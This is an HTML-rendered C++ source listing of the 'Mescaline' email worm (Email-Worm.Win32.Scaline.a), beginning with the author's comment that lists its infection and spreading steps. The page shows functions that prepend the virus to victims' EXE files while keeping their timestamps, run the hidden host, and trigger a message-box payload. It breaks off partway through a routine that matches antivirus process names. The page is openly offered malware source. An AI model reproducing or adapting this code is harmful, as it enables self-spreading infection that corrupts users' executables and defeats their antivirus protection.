<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Scaline.a - mescaline.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
   Mescaline Virus © 2003 DR-EF All Right Reserved
   ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
  When Infected File Is Run The Virus Do This Steps:
    1) Get Virus Path &amp; Command Line
    2) Hide The Virus Process
    3) Disable AntiViruses Monitors
    4) Active The Payload
    5) Go TSR &amp; Infect Any EXE\SCR File After He Closed
    6) Execute The Host
    7) Modify Mirc To Send The Virus To Chatted Users
    8) Infect Every EXE\SCR File In The First Ten Kazaa Shared Dirs
  Every 25 Infections The Virus Use MAPI To Mail Himself To Address That
  He Found In Temporary HTML Files.
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdafx.h&gt;
#include &lt;stdio.h&gt;
#include &lt;malloc.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;shellapi.h&gt;
#include &lt;mapi.h&gt;
</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">=</span><span class="sc4">49160</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">viruscopyright</span><span class="sc10">[]=</span><span class="sc6">"[Mescaline] Virus (c) 2oo3 DR-EF"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">VirusPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">VirusParameters</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">VirusTempFile</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">tagPROCESSENTRY32</span><span class="sc0"> </span><span class="sc11">stproc</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">lst</span><span class="sc10">[</span><span class="sc4">150</span><span class="sc10">][</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">addbook</span><span class="sc10">[</span><span class="sc4">300</span><span class="sc10">][</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">htmfiles</span><span class="sc10">[</span><span class="sc4">300</span><span class="sc10">][</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Founded</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">Position</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*------------------[File Infection Functions]---------------*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">virus_path</span><span class="sc10">[],</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">WriteTo</span><span class="sc10">[],</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Virus_Size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">File_Handle</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">viruscode</span><span class="sc10">=</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">Virus_Size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">File_Handle</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">virus_path</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">viruscode</span><span class="sc10">,</span><span class="sc11">Virus_Size</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">File_Handle</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">WriteTo</span><span class="sc10">,</span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">viruscode</span><span class="sc10">,</span><span class="sc11">Virus_Size</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">viruscode</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infect_file</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Virus_path</span><span class="sc10">[],</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Victim</span><span class="sc10">[],</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mark</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp_file</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">check</span><span class="sc10">[</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">)];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fsize</span><span class="sc10">,</span><span class="sc11">mcmp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">File_Handle</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc11">hfileDT</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">creation</span><span class="sc10">,</span><span class="sc11">access</span><span class="sc10">,</span><span class="sc11">change</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">ffile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">File_Handle</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,&amp;</span><span class="sc11">ffile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fsize</span><span class="sc10">=</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc10">=</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">fsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">,(</span><span class="sc11">fsize</span><span class="sc10">-</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">)),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fread</span><span class="sc10">(&amp;</span><span class="sc11">check</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">),</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">mcmp</span><span class="sc10">=</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">check</span><span class="sc10">,</span><span class="sc11">mark</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mcmp</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">attr</span><span class="sc10">=</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hfileDT</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">GetFileTime</span><span class="sc10">(</span><span class="sc11">hfileDT</span><span class="sc10">,&amp;</span><span class="sc11">creation</span><span class="sc10">,&amp;</span><span class="sc11">access</span><span class="sc10">,&amp;</span><span class="sc11">change</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfileDT</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">Victim</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc6">"_I"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc11">Virus_path</span><span class="sc10">,</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">virus_size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">File_Handle</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc6">"ab"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">mark</span><span class="sc10">),</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">File_Handle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hfileDT</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_WRITE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">hfileDT</span><span class="sc10">,&amp;</span><span class="sc11">creation</span><span class="sc10">,&amp;</span><span class="sc11">access</span><span class="sc10">,&amp;</span><span class="sc11">change</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hfileDT</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc11">attr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Run_Infected_File</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">[],</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Parm</span><span class="sc10">[],</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Virus_Size</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hfile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">h_file</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">ffile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">host_size</span><span class="sc10">,</span><span class="sc11">is_end</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">h_file</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,&amp;</span><span class="sc11">ffile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">host_size</span><span class="sc10">=(</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">nFileSizeLow</span><span class="sc10">-</span><span class="sc11">Virus_Size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">data</span><span class="sc10">=</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">host_size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fseek</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">,</span><span class="sc11">Virus_Size</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">host_size</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp_file</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">cmd</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">File</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc6">"_v"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetFileAttributes</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">       </span><span class="sc2">// ^-&gt; Check If The File Executed Before.
</span><span class="sc0">        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">Parm</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">h_file</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">WinExec</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">hfile</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">host_size</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">hfile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">data</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">h_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc11">temp_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">Parm</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc11">Parm</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">WinExec</span><span class="sc10">(</span><span class="sc11">cmd</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SleepEx</span><span class="sc10">(</span><span class="sc4">500</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">is_end</span><span class="sc10">=</span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">temp_file</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">is_end</span><span class="sc10">!=</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*------------------------[Misc Functions]---------------------*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">PayLoad</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wHour</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Have You Ever Had The Feeling\nThat You Not Sure If We Wake Or Still Dreaming...\nIt's Call Mescaline\nIt's The Only Way To Fly..."</span><span class="sc10">,</span><span class="sc11">viruscopyright</span><span class="sc10">,</span><span class="sc11">MB_ICONINFORMATION</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">9999</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">SetWindowText</span><span class="sc10">((</span><span class="sc11">HWND</span><span class="sc10">)(</span><span class="sc11">i</span><span class="sc10">),</span><span class="sc11">viruscopyright</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AntiAV</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hsnp</span><span class="sc10">,</span><span class="sc11">hproc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">MayBeAV</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">tagPROCESSENTRY32</span><span class="sc0"> </span><span class="sc19">proc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hsnp</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc19">proc</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc19">proc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hsnp</span><span class="sc10">,&amp;</span><span class="sc19">proc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc19">proc</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strlwr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"anti"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"avp"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
           </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"rav"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"nav"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
           </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"troj"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">MayBeAV</span><span class="sc10">,</span><span class="sc6">"scan"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
